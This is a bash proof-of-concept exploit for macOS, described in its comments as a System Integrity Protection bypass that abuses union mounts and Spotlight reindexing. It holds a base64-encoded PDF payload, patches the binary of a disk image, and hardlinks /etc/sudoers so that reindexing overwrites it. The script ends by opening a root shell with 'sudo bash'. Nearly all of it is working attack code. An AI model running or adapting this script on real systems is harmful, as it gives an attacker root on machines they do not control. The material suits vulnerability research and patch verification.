#!/bin/bash
########
# SIP mount-relative bypass for batsignal
# 
# MacOS is still vulnerable to batsignal, because the Sandbox fix removes
# one vector, but union mounts apparently don't care about 'mount-relative'.
# 
# This itself seems like a huge bug.
# 
# In this case, we:
#  1) create a volume
#  2) mount it, copy payload, activate spotlight
#  3) wait until spotlight creates the Cache folder and contents
#  4) get the ID spotlight generates from /Store-V2/???...???/Cache/
#  5) umount
#  6) create the same directory layout outside the volume:
#     ./mnt/.Spotlight-V100/Store-V2/???...???/Cache/0000/0000/0000/
#  7) remount with union
#  8) issue a reindex. This time spotlight will erroneously use our
#     directory outside the volume, allowing us to use hardlinks
#  9) hardlink the $INODE.tmp (18.tmp on my machine) file to sudoers as before
# 10) reindex to trigger the overwrite of 18.tmp with our content
#
# After the exploit ran sudoers is overwritten with content we provided.
# 
# The bug exists because apparently union mounted directories are not
# accounted for in SIP, SIP still thinks we are under:
#    (mount-relative-regex #"^/\.Spotlight-V100($|/)"
# 
# While this is *technically* true, it renders mount-relative-regex
# useless.
# 
########

set -e

function clean ()
{
    rm -rf mnt/
    mkdir -p mnt

    rm -f payload.pdf
    # just a plain pdf with the valid sudoers payload in it
    echo "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MiAwIFI+PgplbmRvYmoKCjQgMCBvYmoKPDwvVHlwZS9QYWdlcwovUmVzb3VyY2VzIDExIDAgUgovTWVkaWFCb3hbIDAgMCA2MTIgNzkyIF0KL0tpZHNbIDEgMCBSIF0KL0NvdW50IDE+PgplbmRvYmoKCjEyIDAgb2JqCjw8L1R5cGUvQ2F0YWxvZy9QYWdlcyA0IDAgUgovT3BlbkFjdGlvblsxIDAgUiAvWFlaIG51bGwgbnVsbCAwXQovTGFuZyhlbi1VUykKPj4KZW5kb2JqCgoxMyAwIG9iago8PC9DcmVhdG9yPEZFRkYwMDU3MDA3MjAwNjkwMDc0MDA2NTAwNzI+Ci9Qcm9kdWNlcjxGRUZGMDA0QzAwNjkwMDYyMDA3MjAwNjUwMDRGMDA2NjAwNjYwMDY5MDA2MzAwNjUwMDIwMDAzNzAwMkUwMDMwPgovQ3JlYXRpb25EYXRlKEQ6MjAyMTExMTcxNzU1MDArMDEnMDAnKT4+CmVuZG9iagoKeHJlZgowIDE0CjAwMDAwMDAwMDAgNjU1MzUgZiAKMDAwMDAwNzA3MyAwMDAwMCBuIAowMDAwMDAwMDE5IDAwMDAwIG4gCjAwMDAwMDAyMzkgMDAwMDAgbiAKMDAwMDAwNzIxNiAwMDAwMCBuIAowMDAwMDAwMjU5IDAwMDAwIG4gCjAwMDAwMDYyMDYgMDAwMDAgbiAKMDAwMDAwNjIyNyAwMDAwMCBuIAowMDAwMDA2NDIyIDAwMDAwIG4gCjAwMDAwMDY3NzQgMDAwMDAgbiAKMDAwMDAwNjk4NiAwMDAwMCBuIAowMDAwMDA3MDE4IDAwMDAwIG4gCjAwMDAwMDczMTUgMDAwMDAgbiAKMDAwMDAwNzQxMiAwMDAwMCBuIAp0cmFpbGVyCjw8L1NpemUgMTQvUm9vdCAxMiAwIFIKL0luZm8gMTMgMCBSCi9JRCBbIDxFNDk0QzZFODI5QzBCREQ5OTAxQTA1OTkzRUZGNUQ3Nj4KPEU0OTRDNkU4MjlDMEJERDk5MDFBMDU5OTNFRkY1RDc2PiBdCi9Eb2NDaGVja3N1bSAvNzYzRkMyNDEzMzY5MjM1ODRCRjEyNDk5NUQxOTVBOEEKPj4Kc3RhcnR4cmVmCjc1ODcKJSVFT0YK" | base64 -d > payload.pdf
}

function create ()
{
    rm -f dangervol.dmg
    hdiutil create -size 64m -fs "HFS+" -volname test dangervol.dmg
}

function firstmount ()
{
    mkdir -p ./mnt/

    hdiutil attach dangervol.dmg -nobrowse -owners off -mountpoint mnt
    mount -t hfs -o update,noowners,union "/dev/${1}s1" mnt
}

function secondmount ()
{
    hdiutil attach dangervol.dmg -nobrowse -owners off -mountpoint mnt
    mount -t hfs -o update,noowners,union "/dev/${1}s1" mnt/
}

function editbinary ()
{
	# modify spotlight dir's name so SIP doesn't care

	# original: 2e00530070006f0074006c0069006700680074002d005600310030003000 - .Spotlight-V100
	# modified: 2e00530070006f0074006c0069006700680074002d005600390030003000 - .Spotlight-V900
	original="2e00530070006f0074006c0069006700680074002d005600310030003000"
	modified="2e00530070006f0074006c0069006700680074002d005600390030003000"

	if [[ $1 == "forward" ]]
	then
		echo "Patching forward"
		A=$original
		B=$modified
	else
		echo "Patching backward"
		A=$modified
		B=$original
	fi

	mv dangervol.dmg oldvol.dmg
	xxd -p oldvol.dmg | tr -d "\n" | sed "s/$A/$B/g" | xxd -r -p > dangervol.dmg;
}

function umount ()
{
    diskutil eject "$1"
}

echo "[+] Finding disk name"
#tmpdiskname=$(diskutil list | grep "^/dev/disk" | cut -d " " -f 1 | tail -n 1 | cut -d "/" -f 3)
tmpdiskname=$(ls /dev/disk* | grep -v "s[0-9]" | cut -d "/" -f 3 |tail -n 1)
disknum=${tmpdiskname:4:5}

DISKNAME="disk$(($disknum+1))"
echo "[+] Disk name: $DISKNAME"

echo "[+] Cleaning"
clean

echo "[+] Creating volume"
create

echo "[+] First mount"
firstmount $DISKNAME

echo "[+] Copying payload"
cp payload.pdf mnt/
sleep 3

echo "[+] Activating spotlight"
mdutil -i on mnt
sleep 5

echo "[+] Umount disk"
umount $DISKNAME

echo "[+] Patch binary"
editbinary "forward"

echo "[+] Mount patched"
secondmount $DISKNAME

echo "[+] Searching for inode"
INODE=$(stat mnt/payload.pdf | cut -d " " -f 2)
echo "[+] Found inode: $INODE"

echo "[+] Getting volume id"
volumeid=$(ls mnt/.Spotlight-V900/Store-V2/)
echo "[+] Volumeid: $volumeid"

echo "[+] Umounting disk"
umount $DISKNAME


echo "[+] Creating our dir structure for cache"
outsidedir="mnt/.Spotlight-V100/Store-V2/$volumeid/Cache/0000/0000/0000/"
mkdir -p $outsidedir

volumeid=$(stat $outsidedir | cut -d " " -f 1)
inode=$(stat $outsidedir | cut -d " " -f 2)
magicname="/.vol/$volumeid/$inode/"

echo "[+] Magicname: $magicname"


echo "[+] Patch binary back"
editbinary backward

echo "[+] Mount patched"
secondmount $DISKNAME
sleep 3


echo "[+] Running reindex"
mdutil -E mnt
sleep 5

# TODO: retry if this fails
echo "[?] Files in our directory"
ls -ali $magicname/
stat $magicname/*

sudo_volid=$(stat /etc/sudoers | cut -d " " -f 1)
ourfile_volid=$(stat $magicname/$INODE.txt | cut -d " " -f 1)

if [[ $sudo_volid == $ourfile_volid ]]
then
    echo "[+] Volume IDs match, $INODE.tmp is on the same volume as sudoers :)"
else
    echo "[-] Volume IDs don't match, aborting :("
    echo "Aborting, volume stays mounted for examination."
    echo "Our underlying directory that should have $INODE.txt is at: $magicname"
    exit 1
fi

echo "[+] Replacing $INODE.tmp with hardlink to sudoers"
ln /etc/sudoers $magicname/$INODE.tmp

echo "[?] Sudoers before"
stat /etc/sudoers

echo "[+] Reindex"
mdutil -E mnt

echo "[+] Waiting 5s"
sleep 5

echo "[?] sudoers after"
stat /etc/sudoers

echo "[+] Umounting"
umount $DISKNAME

echo "[+] Cleanup"
rm -rf dangervol.dmg oldvol.dmg payload.pdf mnt

echo "[+] Done, enjoy your shell :)"
sudo bash

